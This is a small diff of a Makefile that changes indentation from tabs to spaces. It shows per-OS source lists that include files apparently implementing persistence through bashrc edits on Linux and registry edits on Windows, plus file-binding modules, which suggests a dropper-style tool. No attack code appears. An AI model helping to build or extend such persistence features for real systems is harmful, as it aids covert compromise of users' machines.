@@ -16,23 +16,23 @@ CONF_FILE = config/current_config.conf
 
 # 根据配置文件设置源文件和编译选项
 ifeq ($(OS),linux)
-	SOURCES = src/main.c src/system_info.c src/linux_persistence_bashrc.c src/release_bind_files.c src/bind_files.c
-	ifeq ($(FEATURE_BASHRC_MOD),1)
-		CFLAGS += -DBASHRC_MOD
-	endif
+    SOURCES = src/main.c src/system_info.c src/linux_persistence_bashrc.c src/release_bind_files.c src/bind_files.c
+    ifeq ($(FEATURE_BASHRC_MOD),1)
+        CFLAGS += -DBASHRC_MOD
+    endif
 endif
 
 ifeq ($(OS),windows)
-	SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
-	ifeq ($(FEATURE_REGISTRY_MOD),1)
-		SOURCES += src/windows_persistence_registry.c
-		CFLAGS += -DREGISTRY_MOD
-	endif
+    SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
+    ifeq ($(FEATURE_REGISTRY_MOD),1)
+        SOURCES += src/windows_persistence_registry.c
+        CFLAGS += -DREGISTRY_MOD
+    endif
 endif
 
 ifeq ($(OS),mac)
-	SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
-	# 根据mac系统添加特定的功能代码
+    SOURCES = src/main.c src/system_info.c src/release_bind_files.c src/bind_files.c
+    # 根据mac系统添加特定的功能代码
 endif
 
 # 确保 SOURCES 不为空
